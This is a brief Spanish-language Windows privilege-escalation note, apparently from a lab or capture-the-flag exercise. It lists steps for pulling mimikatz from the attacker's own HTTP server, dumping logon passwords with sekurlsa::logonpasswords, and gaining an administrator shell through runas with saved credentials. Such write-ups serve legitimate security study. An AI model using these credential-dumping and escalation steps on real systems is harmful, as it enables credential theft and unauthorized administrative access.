Root.txt
Mirar si hay credenciales guardadas en el Credential Manager

Descargar mimikatz.exe:
    - python3 - hhtp.server
    - En el edge, descargar, poniendo nuestra IP

Ejecutar mimikatz.exe:
    - log
    - privilege::debug, 
    - sekurlsa::logonpasswords
    - exit 

Y en el archivo .log creado o en la pantalla mismo, ver si hay alguna cred. ¡Bingo! Tenemos la del admin. Al pareceder a ejecutado alguna tarea y se han 
guardado sus credenciales.

Ahora con la pass podemos convertirnos en admin:
runas /user:administrator /savedcred powershell